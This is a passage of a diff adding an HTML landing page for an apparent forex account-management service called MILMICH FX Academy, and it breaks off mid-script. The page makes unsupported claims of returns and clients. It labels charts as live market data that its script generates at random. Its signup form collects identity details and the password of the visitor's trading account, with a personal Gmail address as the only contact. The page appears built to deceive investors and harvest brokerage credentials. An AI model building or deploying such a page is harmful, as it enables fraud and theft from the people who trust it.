@@ -1,0 +1,1603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MILMICH FX ACADEMY - Forex Account Management</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #0a1628;
+            --secondary: #1a2332;
+            --accent: #00d4ff;
+            --accent-glow: rgba(0, 212, 255, 0.3);
+            --bullish: #00d084;
+            --bearish: #ff4757;
+            --text: #e0e6ed;
+            --text-muted: #8892a0;
+            --border: #2a3441;
+            --card-bg: #111827;
+            --input-bg: #1f2937;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--primary);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(10, 22, 40, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 2rem;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: white;
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .brand-name {
+            font-size: 1.5rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--accent), #fff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .brand-sub {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+            position: relative;
+        }
+
+        .nav-links a:hover, .nav-links a.active {
+            color: var(--accent);
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            transition: width 0.3s;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--accent);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        /* Hero Section */
+        .hero {
+            margin-top: 80px;
+            padding: 3rem 2rem;
+            text-align: center;
+            background: linear-gradient(180deg, rgba(0,212,255,0.05) 0%, transparent 100%);
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(90deg, #fff, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            color: var(--text-muted);
+            font-size: 1.1rem;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+
+        .cta-btn {
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            color: white;
+            border: none;
+            padding: 1rem 3rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 20px var(--accent-glow);
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 30px var(--accent-glow);
+        }
+
+        /* Charts Section */
+        .charts-section {
+            padding: 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            color: var(--accent);
+        }
+
+        .charts-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+        }
+
+        .chart-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            transition: all 0.3s;
+        }
+
+        .chart-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.1);
+        }
+
+        .chart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .pair-name {
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        .pair-change {
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .positive {
+            background: rgba(0, 208, 132, 0.2);
+            color: var(--bullish);
+        }
+
+        .negative {
+            background: rgba(255, 71, 87, 0.2);
+            color: var(--bearish);
+        }
+
+        .chart-canvas {
+            width: 100%;
+            height: 200px;
+            background: var(--secondary);
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .chart-info {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        /* Stats Bar */
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            padding: 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+
+        /* Form Section */
+        .form-section {
+            padding: 4rem 2rem;
+            background: linear-gradient(180deg, transparent 0%, rgba(0,212,255,0.03) 100%);
+        }
+
+        .form-container {
+            max-width: 700px;
+            margin: 0 auto;
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent), #0099cc, var(--accent));
+        }
+
+        .form-step {
+            display: none;
+        }
+
+        .form-step.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .step-dot {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--secondary);
+            border: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            transition: all 0.3s;
+        }
+
+        .step-dot.active {
+            background: var(--accent);
+            border-color: var(--accent);
+            color: var(--primary);
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .step-dot.completed {
+            background: var(--bullish);
+            border-color: var(--bullish);
+            color: white;
+        }
+
+        .step-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--border);
+            z-index: -1;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .form-row.three-col {
+            grid-template-columns: 1fr 1fr 1fr;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 1rem;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px var(--accent-glow);
+        }
+
+        .btn-secondary {
+            background: var(--secondary);
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .account-type-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .account-type-card {
+            padding: 1.5rem;
+            background: var(--input-bg);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .account-type-card:hover {
+            border-color: var(--accent);
+        }
+
+        .account-type-card.selected {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .account-type-card i {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .platform-card {
+            padding: 1rem;
+            background: var(--input-bg);
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .platform-card:hover {
+            border-color: var(--accent);
+        }
+
+        .platform-card.selected {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .error-msg {
+            color: var(--bearish);
+            font-size: 0.85rem;
+            margin-top: 0.25rem;
+            display: none;
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+
+        /* Testimonials */
+        .testimonials {
+            padding: 4rem 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .testimonials-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .testimonial-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem;
+            position: relative;
+        }
+
+        .testimonial-card::before {
+            content: '"';
+            font-size: 4rem;
+            color: var(--accent);
+            opacity: 0.3;
+            position: absolute;
+            top: 10px;
+            left: 20px;
+        }
+
+        .testimonial-text {
+            margin-bottom: 1rem;
+            line-height: 1.6;
+            color: var(--text-muted);
+        }
+
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .author-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .author-info h4 {
+            font-size: 1rem;
+        }
+
+        .author-info p {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--secondary);
+            border-top: 1px solid var(--border);
+            padding: 3rem 2rem 2rem;
+            margin-top: 4rem;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 3rem;
+        }
+
+        .footer-section h3 {
+            color: var(--accent);
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+        }
+
+        .footer-section p, .footer-section a {
+            color: var(--text-muted);
+            text-decoration: none;
+            line-height: 2;
+            font-size: 0.9rem;
+            display: block;
+        }
+
+        .footer-section a:hover {
+            color: var(--accent);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            margin-top: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 1rem;
+            }
+
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: var(--primary);
+                flex-direction: column;
+                padding: 1rem;
+                border-bottom: 1px solid var(--border);
+            }
+
+            .nav-links.active {
+                display: flex;
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .hero {
+                margin-top: 70px;
+                padding: 2rem 1rem;
+            }
+
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+
+            .hero p {
+                font-size: 1rem;
+            }
+
+            .charts-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .form-container {
+                padding: 1.5rem;
+                margin: 0 1rem;
+            }
+
+            .form-row,
+            .form-row.three-col {
+                grid-template-columns: 1fr;
+            }
+
+            .account-type-grid,
+            .platform-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .stats-bar {
+                grid-template-columns: repeat(2, 1fr);
+                padding: 1rem;
+            }
+
+            .testimonials-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .brand-name {
+                font-size: 1.1rem;
+            }
+
+            .logo-img {
+                width: 40px;
+                height: 40px;
+                font-size: 1rem;
+            }
+
+            .hero h1 {
+                font-size: 1.5rem;
+            }
+
+            .step-dot {
+                width: 30px;
+                height: 30px;
+                font-size: 0.85rem;
+            }
+
+            .btn-group {
+                flex-direction: column;
+            }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--border);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 2rem auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 3rem 2rem;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--bullish);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            font-size: 2.5rem;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--primary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+
+        /* Live indicator */
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.75rem;
+            color: var(--bullish);
+            margin-bottom: 1rem;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--bullish);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-section">
+            <img src="./ChatGPT Image Jun 22, 2026, 12_54_21 PM.png" width="6%" height="6%">
+            <div>
+                <div class="brand-name">MILMICH FX</div>
+                <div class="brand-sub">ACADEMY</div>
+            </div>
+        </div>
+        <button class="mobile-menu-btn" onclick="toggleMenu()">☰</button>
+        <ul class="nav-links" id="navLinks">
+            <li><a href="./index.html" class="active">Home</a></li>
+           
+            <li><a href="./Contact.html">Contact</a></li>
+        </ul>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <h1>Master the Markets with MILMICH FX</h1>
+        <p>Professional forex account management and binary trading education. Join thousands of successful traders who trust us with their investments.</p>
+        <a href="#register" class="cta-btn">Start Trading Now</a>
+    </section>
+
+    <!-- Stats Bar -->
+    <div class="stats-bar">
+        <div class="stat-card">
+            <div class="stat-value" id="statClients">2,847</div>
+            <div class="stat-label">Active Clients</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value">$14.2M</div>
+            <div class="stat-label">Assets Managed</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value">94%</div>
+            <div class="stat-label">Success Rate</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value">24/7</div>
+            <div class="stat-label">Support Available</div>
+        </div>
+    </div>
+
+    <!-- Charts Section -->
+    <section class="charts-section" id="charts">
+        <h2 class="section-title">Live Market Charts</h2>
+        <div class="live-indicator">
+            <span class="live-dot"></span>
+            <span>LIVE MARKET DATA</span>
+        </div>
+        <div class="charts-grid" id="chartsGrid">
+            <!-- Charts will be generated by JavaScript -->
+        </div>
+    </section>
+
+    <!-- Registration Form -->
+    <section class="form-section" id="register">
+        <div class="form-container">
+            <div class="step-indicator">
+                <div class="step-dot active" id="dot1">1</div>
+                <div class="step-dot" id="dot2">2</div>
+                <div class="step-dot" id="dot3">3</div>
+            </div>
+
+            <form id="tradingForm" onsubmit="return false;">
+                
+                <!-- Step 1: Personal Information -->
+                <div class="form-step active" id="step1">
+                    <h2 class="form-title">Personal Information</h2>
+                    <p class="form-subtitle">Please fill in your details as they appear on your ID card</p>
+                    
+                    <div class="form-group">
+                        <label for="country">Country of Residence *</label>
+                        <select id="country" name="country" required>
+                            <option value="">Select your country</option>
+                        </select>
+                        <span class="error-msg" id="countryError">Please select your country</span>
+                    </div>
+
+                    <div class="form-row three-col">
+                        <div class="form-group">
+                            <label for="firstName">First Name *</label>
+                            <input type="text" id="firstName" name="firstName" placeholder="As on ID card" required>
+                            <span class="error-msg" id="firstNameError">First name is required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="middleName">Middle Name</label>
+                            <input type="text" id="middleName" name="middleName" placeholder="Optional">
+                        </div>
+                        <div class="form-group">
+                            <label for="lastName">Last Name *</label>
+                            <input type="text" id="lastName" name="lastName" placeholder="As on ID card" required>
+                            <span class="error-msg" id="lastNameError">Last name is required</span>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="email">Email Address *</label>
+                            <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                            <span class="error-msg" id="emailError">Valid email is required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number *</label>
+                            <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900" required>
+                            <span class="error-msg" id="phoneError">Phone number is required</span>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-primary" onclick="nextStep(1)">Continue →</button>
+                    </div>
+                </div>
+
+                <!-- Step 2: Account Details -->
+                <div class="form-step" id="step2">
+                    <h2 class="form-title">Account Details</h2>
+                    <p class="form-subtitle">Select your account type and provide additional information</p>
+
+                    <div class="form-group">
+                        <label>Account Type *</label>
+                        <div class="account-type-grid">
+                            <div class="account-type-card" onclick="selectAccountType('individual', this)">
+                                <span style="font-size: 2rem;">👤</span>
+                                <h4>Individual Account</h4>
+                                <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Personal trading account</p>
+                            </div>
+                            <div class="account-type-card" onclick="selectAccountType('corporate', this)">
+                                <span style="font-size: 2rem;">🏢</span>
+                                <h4>Corporate Account</h4>
+                                <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Business trading account</p>
+                            </div>
+                        </div>
+                        <input type="hidden" id="accountType" name="accountType" required>
+                        <span class="error-msg" id="accountTypeError">Please select an account type</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="dob">Date of Birth *</label>
+                        <input type="date" id="dob" name="dob" required>
+                        <span class="error-msg" id="dobError">Date of birth is required</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="address">Street Address *</label>
+                        <input type="text" id="address" name="address" placeholder="123 Trading Street" required>
+                        <span class="error-msg" id="addressError">Address is required</span>
+                    </div>
+
+                    <div class="form-row three-col">
+                        <div class="form-group">
+                            <label for="city">City *</label>
+                            <input type="text" id="city" name="city" placeholder="New York" required>
+                            <span class="error-msg" id="cityError">City is required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="state">State / Province *</label>
+                            <input type="text" id="state" name="state" placeholder="NY" required>
+                            <span class="error-msg" id="stateError">State is required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="zip">ZIP / Postal Code *</label>
+                            <input type="text" id="zip" name="zip" placeholder="10001" required>
+                            <span class="error-msg" id="zipError">ZIP code is required</span>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="prevStep(2)">← Back</button>
+                        <button type="button" class="btn btn-primary" onclick="nextStep(2)">Continue →</button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Trading Platform -->
+                <div class="form-step" id="step3">
+                    <h2 class="form-title">Trading Platform</h2>
+                    <p class="form-subtitle">Connect your trading platform and account details</p>
+
+                    <div class="form-group">
+                        <label>Select Trading Platform *</label>
+                        <div class="platform-grid">
+                            <div class="platform-card" onclick="selectPlatform('MT4', this)">
+                                <strong>MetaTrader 4</strong>
+                                <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem;">Most Popular</p>
+                            </div>
+                            <div class="platform-card" onclick="selectPlatform('MT5', this)">
+                                <strong>MetaTrader 5</strong>
+                                <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem;">Advanced</p>
+                            </div>
+                            <div class="platform-card" onclick="selectPlatform('cTrader', this)">
+                                <strong>cTrader</strong>
+                                <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem;">ECN Platform</p>
+                            </div>
+                            
+                        </div>
+                        <input type="hidden" id="platform" name="platform" required>
+                        <span class="error-msg" id="platformError">Please select a trading platform</span>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="loginId">Login ID *</label>
+                            <input type="text" id="loginId" name="loginId" placeholder="Your account login ID" required>
+                            <span class="error-msg" id="loginIdError">Login ID is required</span>
+                        </div>
+                        <div class="form-group">
+                            <label for="serverName">Server Name *</label>
+                            <input type="text" id="serverName" name="serverName" placeholder="e.g., Exness-MT5Trial" required>
+                            <span class="error-msg" id="serverNameError">Server name is required</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Account Password *</label>
+                        <input type="password" id="password" name="password" placeholder="Your trading account password" required>
+                        <span class="error-msg" id="passwordError">Password is required</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="amount">Account Balance (USD) *</label>
+                        <input type="number" id="amount" name="amount" placeholder="Minimum $1,000" min="1000" step="100" required>
+                        <span class="error-msg" id="amountError">Minimum account balance is $1,000</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label style="display: flex; align-items: flex-start; gap: 0.5rem; cursor: pointer;">
+                            <input type="checkbox" id="agreement" style="width: auto; margin-top: 0.2rem;" required>
+                            <span style="font-size: 0.85rem; color: var(--text-muted);">I agree to the Terms of Service and authorize MILMICH FX Academy to manage my trading account. I understand that trading involves risk.</span>
+                        </label>
+                        <span class="error-msg" id="agreementError">You must agree to the terms</span>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="prevStep(3)">← Back</button>
+                        <button type="button" class="btn btn-primary" onclick="submitForm()">Submit Application</button>
+                    </div>
+                </div>
+
+                <!-- Success Message -->
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">✓</div>
+                    <h2 style="margin-bottom: 1rem; color: var(--bullish);">Application Submitted!</h2>
+                    <p style="color: var(--text-muted); margin-bottom: 1.5rem;">Thank you for choosing MILMICH FX Academy. Our team will review your application and contact you within 24 hours.</p>
+                    <p style="color: var(--text-muted); font-size: 0.9rem;">A confirmation email has been sent to <span id="confirmEmail" style="color: var(--accent);"></span></p>
+                    <button type="button" class="btn btn-primary" style="margin-top: 2rem;" onclick="resetForm()">Submit Another Application</button>
+                </div>
+
+                <div class="spinner" id="spinner"></div>
+            </form>
+        </div>
+    </section>
+
+   
+    <!-- Footer -->
+    <footer class="footer" id="contact">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>MILMICH FX ACADEMY</h3>
+                <p>Professional forex account management and trading education. We help traders achieve financial freedom through expert guidance and proven strategies.</p>
+            </div>
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <a href="#home">Home</a>
+                
+                
+            </div>
+            <div class="footer-section">
+                <h3>Contact Us</h3>
+                <p>Email: oriamichelle874@gmail.com</p>
+                <p>Support: Available 24/7</p>
+                <p>Response Time: Within 24 hours</p>
+            </div>
+           
+        </div>
+        <div class="footer-bottom">
+            <p>© 2026 MILMICH FX Academy. All rights reserved. Trading involves substantial risk of loss.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Country list (190 countries)
+        const countries = [
+            "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria",
+            "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan",
+            "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia",
+            "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica",
+            "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt",
+            "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon",
+            "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana",
+            "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel",
+            "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo",
+            "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania",
+            "Luxembourg", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius",
+            "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia",
+            "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman",
+            "Pakistan", "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal",
+            "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe",
+            "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia",
+            "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan",
+            "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan",
+            "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City",
+            "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"
+        ];
+
+        // Populate country dropdown
+        const countrySelect = document.getElementById('country');
+        countries.forEach(country => {
+            const option = document.createElement('option');
+            option.value = country;
+            option.textContent = country;
+            countrySelect.appendChild(option);
+        });
+
+        // Mobile menu toggle
+        function toggleMenu() {
+            document.getElementById('navLinks').classList.toggle('active');
+        }
+
+        // Close mobile menu when clicking a link
+        document.querySelectorAll('.nav-links a').forEach(link => {
+            link.addEventListener('click', () => {
+                document.getElementById('navLinks').classList.remove('active');
+            });
+        });
+
+        // Active nav link on scroll
+        window.addEventListener('scroll', () => {
+            const sections = document.querySelectorAll('section, .hero');
+            const navLinks = document.querySelectorAll('.nav-links a');
+            
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (scrollY >= sectionTop - 200) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === '#' + current) {
+                    link.classList.add('active');
+                }
+            });
+        });
+
+        // Candlestick Chart Generator
+        class CandlestickChart {
+            constructor(canvasId, pair, initialPrice) {
+                this.canvas = document.getElementById(canvasId);
+                this.ctx = this.canvas.getContext('2d');
+                this.pair = pair;
+                this.price = initialPrice;
+                this.candles = [];
+                this.maxCandles = 30;
+                this.generateInitialCandles();
+                this.draw();
+            }
+
+            generateInitialCandles() {
+                for (let i = 0; i < this.maxCandles; i++) {
+                    this.addCandle();
+                }
+            }
+
+            addCandle() {
+                const volatility = this.price * 0.002;
+                const open = this.price;
+                const change = (Math.random() - 0.5) * volatility * 2;
+                const close = open + change;
